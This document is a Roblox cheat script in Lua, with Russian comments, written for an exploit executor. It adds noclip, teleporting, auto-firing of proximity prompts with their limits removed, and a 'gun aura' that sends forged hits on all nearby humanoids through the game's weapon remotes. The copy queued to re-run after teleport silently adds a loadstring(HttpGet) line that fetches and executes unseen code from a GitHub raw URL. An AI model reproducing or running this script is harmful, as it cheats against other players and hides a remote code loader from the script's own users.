wait(3)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local ProximityPromptService = game:GetService("ProximityPromptService")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local camera = Workspace.CurrentCamera
local rootPart = char:WaitForChild("HumanoidRootPart")
local noclipEnabled = true
local gunAuraEnabled = true

wait(3)

if workspace:FindFirstChild("Train") then
    wait(1)

    player.CameraMode = Enum.CameraMode.Classic
    player.CameraMinZoomDistance = 0
    player.CameraMaxZoomDistance = 150000

    local backpack = player.Backpack

    if #backpack:GetChildren() >= 3 then
        local p = game:GetService("Players").LocalPlayer
local r = p:FindFirstChild("Backpack"):FindFirstChild("Revolver")
if r and r:IsA("Tool") then
    r.Parent = p.Character
end

    end

    -- Ждём появления оружия и конфигурации
    task.spawn(function()
        local tool
        repeat
            tool = char:FindFirstChildOfClass("Tool")
            task.wait(0.2)
        until tool and tool:FindFirstChild("WeaponConfiguration")
      
        rootPart.CFrame = CFrame.new(-424, 28, -49041)
        rootPart.Anchored = true
        wait(3)
       
        local function shootNearbyTargets()
            if not gunAuraEnabled then return end

            local gun = char:FindFirstChildOfClass("Tool")
            if not gun or not gun:FindFirstChild("WeaponConfiguration") then return end

            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("Model") and v ~= char and v:FindFirstChild("Humanoid") and v:FindFirstChild("Head") then
                    local humanoid = v:FindFirstChild("Humanoid")
                    local head = v:FindFirstChild("Head")
                    if humanoid and humanoid.Health > 0 then
                        local distance = (char:GetPivot().Position - head.Position).Magnitude
                        if distance <= 100 then
                            local hits = {}
                            for i = 1, gun.WeaponConfiguration.PelletsPerBullet.Value do
                                hits[tostring(i)] = humanoid
                            end
                            ReplicatedStorage.Remotes.Weapon.Shoot:FireServer(
                                workspace:GetServerTimeNow(),
                                gun,
                                CFrame.lookAt(head.Position + Vector3.new(0, 1, 0), head.Position),
                                hits
                            )
                            ReplicatedStorage.Remotes.Weapon.Reload:FireServer(workspace:GetServerTimeNow(), gun)
                        end
                    end
                end
            end
        end

        while task.wait(1) do
            shootNearbyTargets()
        end
    end)

    -- Телепортация и действия персонажа
    

    task.delay(15, function()
        rootPart.Anchored = false

        local humanoid = char:WaitForChild("Humanoid")
        wait(0.3)
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        humanoid:MoveTo(Vector3.new(-413, 2, -49046))
        wait(2)
        humanoid:MoveTo(Vector3.new(-421, 2, -49046))
        wait(30)
        humanoid:MoveTo(Vector3.new(-339, 2, -49044))
    end)

    -- Noclip
    RunService.Stepped:Connect(function()
        if noclipEnabled and char then
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") and part.CanCollide then
                    part.CanCollide = false
                end
            end
        end
    end)

    -- Прокачка проксимити-промптов
    local function setupPrompt(pr)
        if pr:IsA("ProximityPrompt") then
            pr.RequiresLineOfSight = false
            pr.MaxActivationDistance = math.huge
            pr.HoldDuration = 0
        end
    end

    for _, o in ipairs(workspace:GetDescendants()) do
        if o:IsA("ProximityPrompt") then
            setupPrompt(o)
        end
    end

    workspace.DescendantAdded:Connect(function(o)
        if o:IsA("ProximityPrompt") then
            task.wait(0.1)
            setupPrompt(o)
        end
    end)

    local function interactWithPrompt(prompt)
        local root = char:WaitForChild("HumanoidRootPart", 3)
        if prompt.Enabled and prompt.HoldDuration == 0 then
            if (prompt.Parent.Position - root.Position).Magnitude <= 12 then
                fireproximityprompt(prompt)
            end
        end
    end

    ProximityPromptService.PromptShown:Connect(function(prompt)
        interactWithPrompt(prompt)
    end)

    task.spawn(function()
        while true do
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                for _, prompt in ipairs(workspace:GetDescendants()) do
                    if prompt:IsA("ProximityPrompt") and prompt.Enabled and prompt.HoldDuration == 0 then
                        interactWithPrompt(prompt)
                    end
                end
            end
            task.wait(0.1)
        end
    end)
end


if workspace:FindFirstChild("TeleportZones") then
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")

    local player = Players.LocalPlayer

    -- Включаем ноуклип навсегда
    RunService.Stepped:Connect(function()
        local char = player.Character
        if char then
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end)

    -- Постоянное движение к TeleportZone
    task.spawn(function()
        while true do
            local char = player.Character or player.CharacterAdded:Wait()
            local hum = char:FindFirstChildOfClass("Humanoid")
            local zone = workspace:FindFirstChild("TeleportZones")
            local teleportZone = zone and zone:FindFirstChild("TeleportZone")
            if hum and teleportZone and teleportZone:IsA("Model") then
                local part = teleportZone:FindFirstChildWhichIsA("BasePart")
                if part then
                    hum:MoveTo(part.Position)
                end
            end
            task.wait(0.2) -- чуть-чуть ждем, чтобы не спамить
        end
    end)
end

queueonteleport([[
wait(3)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local ProximityPromptService = game:GetService("ProximityPromptService")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local camera = Workspace.CurrentCamera
local rootPart = char:WaitForChild("HumanoidRootPart")
local noclipEnabled = true
local gunAuraEnabled = true

wait(3)

if workspace:FindFirstChild("Train") then
    wait(1)

    player.CameraMode = Enum.CameraMode.Classic
    player.CameraMinZoomDistance = 0
    player.CameraMaxZoomDistance = 150000

    local backpack = player.Backpack

    if #backpack:GetChildren() >= 3 then
        local p = game:GetService("Players").LocalPlayer
local r = p:FindFirstChild("Backpack"):FindFirstChild("Revolver")
if r and r:IsA("Tool") then
    r.Parent = p.Character
end

    end

    -- Ждём появления оружия и конфигурации
    task.spawn(function()
        local tool
        repeat
            tool = char:FindFirstChildOfClass("Tool")
            task.wait(0.2)
        until tool and tool:FindFirstChild("WeaponConfiguration")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/wzaxk/check/refs/heads/main/s.txt", true))()

        rootPart.CFrame = CFrame.new(-424, 28, -49041)
        rootPart.Anchored = true
        wait(3)
       
        local function shootNearbyTargets()
            if not gunAuraEnabled then return end

            local gun = char:FindFirstChildOfClass("Tool")
            if not gun or not gun:FindFirstChild("WeaponConfiguration") then return end

            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("Model") and v ~= char and v:FindFirstChild("Humanoid") and v:FindFirstChild("Head") then
                    local humanoid = v:FindFirstChild("Humanoid")
                    local head = v:FindFirstChild("Head")
                    if humanoid and humanoid.Health > 0 then
                        local distance = (char:GetPivot().Position - head.Position).Magnitude
                        if distance <= 100 then
                            local hits = {}
                            for i = 1, gun.WeaponConfiguration.PelletsPerBullet.Value do
                                hits[tostring(i)] = humanoid
                            end
                            ReplicatedStorage.Remotes.Weapon.Shoot:FireServer(
                                workspace:GetServerTimeNow(),
                                gun,
                                CFrame.lookAt(head.Position + Vector3.new(0, 1, 0), head.Position),
                                hits
                            )
                            ReplicatedStorage.Remotes.Weapon.Reload:FireServer(workspace:GetServerTimeNow(), gun)
                        end
                    end
                end
            end
        end

        while task.wait(1) do
            shootNearbyTargets()
        end
    end)

    -- Телепортация и действия персонажа
    

    task.delay(15, function()
        rootPart.Anchored = false

        local humanoid = char:WaitForChild("Humanoid")
        wait(0.3)
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        humanoid:MoveTo(Vector3.new(-413, 2, -49046))
        wait(2)
        humanoid:MoveTo(Vector3.new(-421, 2, -49046))
        wait(30)
        humanoid:MoveTo(Vector3.new(-339, 2, -49044))
    end)

    -- Noclip
    RunService.Stepped:Connect(function()
        if noclipEnabled and char then
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") and part.CanCollide then
                    part.CanCollide = false
                end
            end
        end
    end)

    -- Прокачка проксимити-промптов
    local function setupPrompt(pr)
        if pr:IsA("ProximityPrompt") then
            pr.RequiresLineOfSight = false
            pr.MaxActivationDistance = math.huge
            pr.HoldDuration = 0
        end
    end

    for _, o in ipairs(workspace:GetDescendants()) do
        if o:IsA("ProximityPrompt") then
            setupPrompt(o)
        end
    end

    workspace.DescendantAdded:Connect(function(o)
        if o:IsA("ProximityPrompt") then
            task.wait(0.1)
            setupPrompt(o)
        end
    end)

    local function interactWithPrompt(prompt)
        local root = char:WaitForChild("HumanoidRootPart", 3)
        if prompt.Enabled and prompt.HoldDuration == 0 then
            if (prompt.Parent.Position - root.Position).Magnitude <= 12 then
                fireproximityprompt(prompt)
            end
        end
    end

    ProximityPromptService.PromptShown:Connect(function(prompt)
        interactWithPrompt(prompt)
    end)

    task.spawn(function()
        while true do
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                for _, prompt in ipairs(workspace:GetDescendants()) do
                    if prompt:IsA("ProximityPrompt") and prompt.Enabled and prompt.HoldDuration == 0 then
                        interactWithPrompt(prompt)
                    end
                end
            end
            task.wait(0.1)
        end
    end)
end


if workspace:FindFirstChild("TeleportZones") then
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")

    local player = Players.LocalPlayer

    -- Включаем ноуклип навсегда
    RunService.Stepped:Connect(function()
        local char = player.Character
        if char then
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end)

    -- Постоянное движение к TeleportZone
    task.spawn(function()
        while true do
            local char = player.Character or player.CharacterAdded:Wait()
            local hum = char:FindFirstChildOfClass("Humanoid")
            local zone = workspace:FindFirstChild("TeleportZones")
            local teleportZone = zone and zone:FindFirstChild("TeleportZone")
            if hum and teleportZone and teleportZone:IsA("Model") then
                local part = teleportZone:FindFirstChildWhichIsA("BasePart")
                if part then
                    hum:MoveTo(part.Position)
                end
            end
            task.wait(0.2) -- чуть-чуть ждем, чтобы не спамить
        end
    end)
end
]])
